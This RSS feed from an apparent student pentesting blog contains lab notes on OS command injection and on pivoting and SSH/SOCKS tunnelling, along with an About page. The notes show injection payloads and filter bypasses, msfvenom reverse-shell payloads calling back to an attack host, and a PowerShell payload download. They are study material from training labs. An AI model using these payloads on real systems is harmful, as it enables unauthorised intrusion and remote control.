<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Terminal</title>
    <link>https://peroxidee.github.io/</link>
    <description>Recent content on Terminal</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 25 Sep 2023 16:14:28 -0700</lastBuildDate><atom:link href="https://peroxidee.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>command injections</title>
      <link>https://peroxidee.github.io/posts/cmdinject/</link>
      <pubDate>Mon, 25 Sep 2023 16:14:28 -0700</pubDate>
      
      <guid>https://peroxidee.github.io/posts/cmdinject/</guid>
      <description>command injections Intro to Command Injections A command injection vulnerability is among the most critical types of vulnerabilities. This means that we use system commands on a back-end server, which can be a fatal vulnerability to the integrity of a server. If a web application uses user-controlled input to use sytem commands on servers to get and post specific output, we can place a payload in this part.
What is an Injection?</description>
      <content>&lt;h1 id=&#34;command-injections&#34;&gt;command injections&lt;/h1&gt;
&lt;h1 id=&#34;intro-to-command-injections&#34;&gt;Intro to Command Injections&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;A command injection vulnerability is among the most critical types of vulnerabilities. This means that we use system commands on a back-end server, which can be a fatal vulnerability to the integrity of a server. If a web application uses user-controlled input to use sytem commands on servers to get and post specific output, we can place a payload in this part.&lt;/p&gt;
&lt;h3 id=&#34;what-is-an-injection&#34;&gt;What is an Injection?&lt;/h3&gt;
&lt;p&gt;Injections are in the top 3 risks in OWASP’s Top 10 Web App Risks because of how high their impact and how they tend to be common. This occurs when user-controlled input is then misinterpreted as a part of the web query or code being executed. This can lead to subversion in the intended outcome of the query to a different outcome.&lt;/p&gt;
&lt;p&gt;There are a lot of different types of injections, all different on the type of web query being executed.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;OS Command Injection&lt;/th&gt;
&lt;th&gt;Occurs when a user input is directly used as part of an OS command.&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Code Injection&lt;/td&gt;
&lt;td&gt;Occurs when user input is directly within a function that evaluates code.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL Injections&lt;/td&gt;
&lt;td&gt;Occurs when user input is directly used as part of an SQL query&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;XSS/HTML Injection&lt;/td&gt;
&lt;td&gt;Occurs when exact user input is display on a web page&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;There are a lot of other types, LDAP Injection, NoSQL Injection, HTTP Header Injection, etc… Whenever user input is eued iwhtin a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and maniuple it to change it’s intended purpose. This is why as more web technologies are introduced to more web apps, we can see new types of injections introduced.&lt;/p&gt;
&lt;h3 id=&#34;os-command-injections&#34;&gt;OS Command Injections&lt;/h3&gt;
&lt;p&gt;When it comes to OS Command injections, the user input we abused must directly or indirectly go into or affect a web query that executes system commands. All web programming languages have different fucntions that enable the developer to execute operating system commands directly on the back-end server whenever they need to. This may be used for various purposes, like installing plugins or executing certain application.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP Example&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;touch /tmp/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.pdf.&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;NodeJS Example&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-jsx&#34; data-lang=&#34;jsx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/createfile&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;child_process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`touch /tmp/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;filename&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.txt`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;detection&#34;&gt;Detection&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;The process of detecting basic OS Command Injection vulnerabilites is the same process as exploiting these vulns. We will append our command through various injection methods. If the command output changes from the intended usual result, we have succcessfully exploited the vulnerability, this might not be true for more advanced command injection vulnerabilites because we may utillize various fuzzing methods or code reviews to identify potential command injection vulnerabilites. We may then gradually build our payload until we achiieve command injection. This module will focus on basic command injection, where we control user input that is being directly used ina ssetm command execution a function without any santifizaiton.&lt;/p&gt;
&lt;h3 id=&#34;command-injection-detection&#34;&gt;Command Injection Detection&lt;/h3&gt;
&lt;p&gt;When we visit the web app, we check our host Checker util that appears to ask us for an IP to see if it’s alive or not. We can use something to remove and stop the code before it runs.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Injection Operator&lt;/th&gt;
&lt;th&gt;Injection Character&lt;/th&gt;
&lt;th&gt;URL-Encoded Character&lt;/th&gt;
&lt;th&gt;Executed Command&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Semicolon&lt;/td&gt;
&lt;td&gt;;&lt;/td&gt;
&lt;td&gt;%3b&lt;/td&gt;
&lt;td&gt;Both&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;New Line&lt;/td&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td&gt;%0a&lt;/td&gt;
&lt;td&gt;Both&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Background&lt;/td&gt;
&lt;td&gt;&amp;amp;&lt;/td&gt;
&lt;td&gt;%26&lt;/td&gt;
&lt;td&gt;Both (second output generally shown first)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pipe&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;%7c&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AND&lt;/td&gt;
&lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
&lt;td&gt;%26%26&lt;/td&gt;
&lt;td&gt;Both (only if first succeeds)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OR&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sub-Shell&lt;/td&gt;
&lt;td&gt;``&lt;/td&gt;
&lt;td&gt;%60%60&lt;/td&gt;
&lt;td&gt;Both (Linux-only)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sub-Shell&lt;/td&gt;
&lt;td&gt;$()&lt;/td&gt;
&lt;td&gt;%24%28%29&lt;/td&gt;
&lt;td&gt;Both (Linux-only)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Because our code is sanitized, we will notice that we can’t actually send the code in.&lt;/p&gt;
&lt;h1 id=&#34;injecting-commands&#34;&gt;Injecting Commands&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;We can add a semi=colon after our input, and then add another command, &lt;code&gt;whoami&lt;/code&gt; to this as well.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ping -c 1 127.0.0.1; whoami&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The web app will get mad at us and tell us that it cannot be sent and needs to match the requested format.&lt;/p&gt;
&lt;p&gt;Let’s whip out burpsuite.&lt;/p&gt;
&lt;p&gt;We are going to intercept the requests as a proxy and use it to see how the web app will handle it. We are going to repeat what we did before on the web app with burpsuite.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;POST / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: 94.237.49.11:35165
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language: en-US,en;q=0.5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/x-www-form-urlencoded
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 19
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin: [http://94.237.49.11:35165](http://94.237.49.11:35165/)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection: close
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Referer: [http://94.237.49.11:35165/](http://94.237.49.11:35165/)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests: 1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip=127.0.0.1;whoami
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;other-injection-operators&#34;&gt;Other Injection Operators&lt;/h1&gt;
&lt;hr&gt;
&lt;h3 id=&#34;and-operator&#34;&gt;AND Operator&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ping -c 1 127.0.0.1 &amp;amp;&amp;amp; whoami&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;or-operator&#34;&gt;OR Operator&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ping -c 1 || whoami&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;identifying-filters&#34;&gt;Identifying Filters&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;As we’ve seen in the previous section, sometimes developers will try to secure the web application, against the injections, it can be exploitable if the application is not securely written. Another type of this injection is utilizing blacklisted characters and words on the back-end to detect injections attempts and stop them from going through. WAFs can also be used to block this through a numerous means.&lt;/p&gt;
&lt;p&gt;We will use this section to look at how command injections are blocked and detected.&lt;/p&gt;
&lt;h1 id=&#34;bypassing-space-filters&#34;&gt;Bypassing Space Filters&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;There are numerous ways to detect injection attempts, and there are other ways to go through and avoid these detections. We will be using this with linux and learn how to bypass them through that.&lt;/p&gt;
&lt;p&gt;Bypassing Blackisted Operators&lt;/p&gt;
&lt;p&gt;There are a alot of operators that can be blacklistsed. The one that isn’t is currently new-line.&lt;/p&gt;
&lt;p&gt;Some techniques we can use are:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;{ls,-la}&lt;/th&gt;
&lt;th&gt;Brace Expansion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;${IFS}&lt;/td&gt;
&lt;td&gt;Linux Environmental Variables&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%09&lt;/td&gt;
&lt;td&gt;Tab&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%0a&lt;/td&gt;
&lt;td&gt;Space&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>https://peroxidee.github.io/about/</link>
      <pubDate>Mon, 25 Sep 2023 15:43:06 -0700</pubDate>
      
      <guid>https://peroxidee.github.io/about/</guid>
      <description>welcome to peroxide.global!! this is a centralized site where i wanted to share everything i&amp;rsquo;ve been up to. this might include writeups, notes, and anything else that could be notable. for those that don&amp;rsquo;t know me: i&amp;rsquo;m friday kriedeman, also known as iluvwerewolves and peroxidee. i&amp;rsquo;m a beginner intermediate pentester, a sophomore at csusb studying ist - cybersecurity with a minor in compsci, and i&amp;rsquo;m a passionate ai enthusiast.
i&amp;rsquo;m always on the lookout for new and exciting cybersecurity challenges to tackle.</description>
      <content>&lt;h1 id=&#34;welcome-to-peroxideglobal&#34;&gt;welcome to peroxide.global!!&lt;/h1&gt;
&lt;h2 id=&#34;this-is-a-centralized-site-where-i-wanted-to-share-everything-ive-been-up-to-this-might-include-writeups-notes-and-anything-else-that-could-be-notable&#34;&gt;this is a centralized site where i wanted to share everything i&amp;rsquo;ve been up to. this might include writeups, notes, and anything else that could be notable.&lt;/h2&gt;
&lt;h3 id=&#34;for-those-that-dont-know-me&#34;&gt;for those that don&amp;rsquo;t know me:&lt;/h3&gt;
&lt;p&gt;i&amp;rsquo;m friday kriedeman, also known as iluvwerewolves and peroxidee. i&amp;rsquo;m a beginner intermediate pentester, a sophomore at csusb studying ist - cybersecurity with a minor in compsci, and i&amp;rsquo;m a passionate ai enthusiast.&lt;/p&gt;
&lt;p&gt;i&amp;rsquo;m always on the lookout for new and exciting cybersecurity challenges to tackle. i&amp;rsquo;m a quick learner and i&amp;rsquo;m always eager to expand my knowledge and skills. i&amp;rsquo;m also a team player and i&amp;rsquo;m always willing to lend a helping hand to my fellow cyber warriors.&lt;/p&gt;
&lt;p&gt;i&amp;rsquo;m looking for an opportunity to use my skills and knowledge to make a positive impact on the world. i&amp;rsquo;m confident that i can be a valuable asset to any team, and i&amp;rsquo;m excited to see what the future holds.&lt;/p&gt;
&lt;p&gt;in the meantime, you can find me writing blog posts about cybersecurity, ai, and other nerdy topics. i also enjoy making and listeing to music, reading books, and playing dunegons and dragons.&lt;/p&gt;
&lt;p&gt;so what are you waiting for? set sail on this adventure with me and let&amp;rsquo;s explore the world of cybersecurity together!&lt;/p&gt;
&lt;p&gt;I hope this is more to your liking.&lt;/p&gt;
&lt;h2 id=&#34;im-avaliable-for-contact-at-any-of-these-avenues&#34;&gt;i&amp;rsquo;m avaliable for contact at any of these avenues:&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;discord - iluvwerewolves&lt;/code&gt;
&lt;code&gt;linkedin - friday kriedeman&lt;/code&gt;
&lt;code&gt;github - peroxidee&lt;/code&gt;
&lt;code&gt;hackthebox - iluvwerewolves&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>pivoting, tunneling, and port forwarding</title>
      <link>https://peroxidee.github.io/posts/writeup/</link>
      <pubDate>Mon, 25 Sep 2023 15:14:25 -0700</pubDate>
      
      <guid>https://peroxidee.github.io/posts/writeup/</guid>
      <description>pivoting Notes on pivoting from HTB Academy’s pivoting module INTRO Lateral movement is not the same pivoting because
Lateral Movement is a technique used to gain access to additional hosts within a network environment. This also allows us sometimes to elevate our privileges. However, these are all within the same network. Pivoting is using hosts to cross network boundaries that you usually would not have access to, with the goal being more targeted.</description>
      <content>&lt;h1 id=&#34;pivoting&#34;&gt;pivoting&lt;/h1&gt;
&lt;h2 id=&#34;notes-on-pivoting-from-htb-academys-pivoting-module&#34;&gt;Notes on pivoting from HTB Academy’s pivoting module&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;intro&#34;&gt;INTRO&lt;/h3&gt;
&lt;p&gt;Lateral movement is not the same pivoting because&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lateral Movement is a technique used to gain access to additional hosts within a network environment. This also allows us sometimes to elevate our privileges. However, these are all within the same network.&lt;/li&gt;
&lt;li&gt;Pivoting is using hosts to cross network boundaries that you usually would not have access to, with the goal being more targeted. It is used to move between networks.&lt;/li&gt;
&lt;li&gt;Tunneling is using various protocols to shuttle traffic in and out of a network where there is a chance that we can be detected. By sending requests inside of HTTP or even HTTPS, we can hide our attacks in plain sight.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IP Addresses are assigned to NICs, or Network Adapters. A computer can have more than one of these, and can also be on multiple networks. Looking for extra IP Address can help us see if there’s any other networks we may be apart of.&lt;/p&gt;
&lt;p&gt;Routers have routing tables that forwards traffic based on IP Addresses. This would be done by checking what address the packet has on it to be sent to, and it is then sent to the right gateway from the NIC.&lt;/p&gt;
&lt;p&gt;Protocols are rules that govern how we communicate over networks and which ports we can communicate to.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;dynamic-port-forwarding-with-ssh-and-sockshttpsenwikipediaorgwikisocks-tunneling&#34;&gt;Dynamic Port Forwarding With SSH and &lt;a href=&#34;https://en.wikipedia.org/wiki/SOCKS&#34;&gt;SOCKS&lt;/a&gt; Tunneling.&lt;/h2&gt;
&lt;p&gt;Port fowarding is a technique that allows us to redirct a commmunication request from a port to another. This uses tcp as it’s layer, and SSH and SOCKS can be used to encapsulate the traffic. This can be used to bypass firewalls and gain access to other hosts in the network.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;To execute the port forward, we should use this command.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 1234:localhost:3306 Ubuntu@10.129.202.6&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The -L command tells the SSH client to ask the SSH to forward all the data from port 22 to port 1234 to &lt;a href=&#34;http://localhost:3306&#34;&gt;localhost:3306&lt;/a&gt; on the other server. By doing this, this allows to access the MySQL service from our port 1234. We can then use netstat or Nmap to check if this is working.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap -v -sV -p1234 localhost&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netstat -antp | grep 1234&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can also forward multiple ports using this same technique, using spaces.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once you’ve port forwarded, you can usually use a commannd like &lt;code&gt;ifconfig&lt;/code&gt; to check what NICs exist on the machine, which we can then use to see what other networks the host machine could be connected to.&lt;/p&gt;
&lt;p&gt;We don’t know what could lie on the other network. Once on here, we can use a Smaller IP range or just scan the entire subnet. In order to achive this and get to this spot, we will need to do dynamic port forwarding and pivoting. This can be done by starting a SOCKS listener on our local host, and then confgiuring SSH to forward our traffic via SSH to the other network. This is known as SSH tunneling over SOCKS proxy. SOCKS is Socket Secure, and it is a protocal that helps communicate with servers that have firewall restrictions in place. Unlike most cases where you would intitate a connection to connect to a service, in the case of SOCKS, the inital traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client side. Once the connection is established, network traffic cna be routed through the SOCKS server on behalf of the connected client.&lt;/p&gt;
&lt;p&gt;This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types, SOCKS4 and SOCKS5. SOCKS does not provide any authentication and UDP support, where 5 allows authetication.&lt;/p&gt;
&lt;p&gt;Here is an image of a network that’s on NAT, of 172.16.5.0/23, which we cannot access directly.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;The attack host starts the SSH client and requests the SSH server to allow it send some TCP data over the ssh socket. The SSH responds with an acknowledgement, and the SSH client then starts listening on &lt;a href=&#34;http://localhost:9050&#34;&gt;localhost:9050&lt;/a&gt;. Whatever data you send to this port will broadcast to the entire network, 172.16.5.0/23 over SSH. We can use the command below to perform this dynamic port forwarding.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -D 9050 ubuntu@10.129.202.64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The -D argurment tells the SSH server to endable dynamic port forwarding. Once it’s enabled, it will reqiure a tool that can route our packets over the port 9050. A tool we’re using is called proxychains, this is capable of redirecting TCP connections thorugh TOR, SOCKS, and HTTP/S proxy servers and also allows us to chain multiple servers togtehr. Using this, we can hide the IP address of both teh requesting and receiving hosts, and these two can only see the IP of the pivot host. This tool is often used to force TCP Traffic to go through hosted proxies like SOCKS4/5, TOR, or HTTP/S proxies.&lt;/p&gt;
&lt;p&gt;To inform proxychains that we must use port 9050, we must modify the configuration file at /etc/proxychains.conf. Then, we add &lt;code&gt;socks4 127.0.0.1 9050&lt;/code&gt; to this file, if it’s not already there.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tail -4 /etc/proxychains.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now when we start Nmap with proxychains, it will route all Nmap comands to the local port 9050, where SSH is listening, which will then forward everything over SSH to the other network.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains nmap -v -sn 172.16.5.1-200&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This is known as SOCKS tunneling. We cna only do a full TCP connect scan, as proxychains only understands full packets. ICMP requests are also blocked by Windows Defender. The full TCP scan will take a long time so we should instead only target a single target.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains nmap -v -Pn -sT 172.16.5.19&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Metasploit can also be used with proxychains.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains msfconsole&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The application of Dynamic Port Forwarding is interesting because of how it allowed me to send packets from my machine through another. I found that loging in through metas&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;remotereverse-port-fowarding-with-ssh&#34;&gt;Remote/Reverse Port Fowarding with SSH&lt;/h2&gt;
&lt;p&gt;Now that we’ve done local port forwading, where SSH can listen on our local hos and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. We also might want to consider that we should forward a local service to a local port. Let’s use our previous example.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;The outgoing connection for the Windows host is only limited to the 172.16.5.0/23 network, because Windows host does not have any direct connection with the network the attack host is on. This means that if we try to use metasploit to gain a foothold, we won’t be able to because the Windows server cannot route to have traffic leaving it’s network.&lt;/p&gt;
&lt;p&gt;Often, we won’t be able to get an RDC, and so we need to find a pivot host, a connection point between our attack host and the Window server. This will be the ubuntu server. We will need to create a Meterpeter HTTPS payload, using msfvenom, but configure the reverse connection to use the Ubuntu’s server.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_https lhost= &amp;lt;InternalIPofPivotHost&amp;gt; -f exe -o backupscript.exe LPORT=8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once the payload is created and our listener exist, we can copy this payload to the Ubuntu machine using SCP beecause we have the credentials.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scp backupscript.exe ubuntu@&amp;lt;ipAddressofTarget&amp;gt;:~/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python3 -m http.server 8123&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once on the ubuntu server, we can then use it to upload our payload to the windows server, by invoking it as a web request.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Invoke-WebRequest -Uri &amp;quot;http://172.16.5.129:8123/backupscript.exe&amp;quot; -OutFile &amp;quot;C:\backupscript.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once this payload is downloaded, we can use our SSH port fowarding remotely to forward the port 8000 to the Ubuntu’s 8080 port. We can then use the -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R asks us to remotely listen on the target, and send all incoming 8080 connections to us.&lt;/p&gt;
&lt;p&gt;After doing this, we should have a session established from meterpreter.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;meterpreter-tunneling-and-port-forwarding&#34;&gt;Meterpreter Tunneling and Port Forwarding&lt;/h2&gt;
&lt;p&gt;In the case where we can use meterpreter without having to care for SSH, we can use pivots with our session as well. We can create a shell for the Ubuntu server which will allow us to return a shell on our attack host on port 8080&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;After creating the payload, we should start a handler to handle our payload.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msf6 &amp;gt; use exploit/multi/handle&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can take the payload titled &lt;code&gt;backupjob&lt;/code&gt; to the ubuntu host over SSH - scp, once this works out, we need to run it on there. Running this will tunnel us through the other machine.&lt;/p&gt;
&lt;p&gt;Once we’ve established our meterpreter tunnel, we can run a ping sweep. We know that our Windows target is on 172.16.5.0/23 network, and assuming that the firewall on the Windows target is allowing us to do an ICMP request, we can perform a ping sweep on the network. We can do this using Meterpreter with the ping_sweep module, which will sweep the network with ICMP requests.&lt;/p&gt;
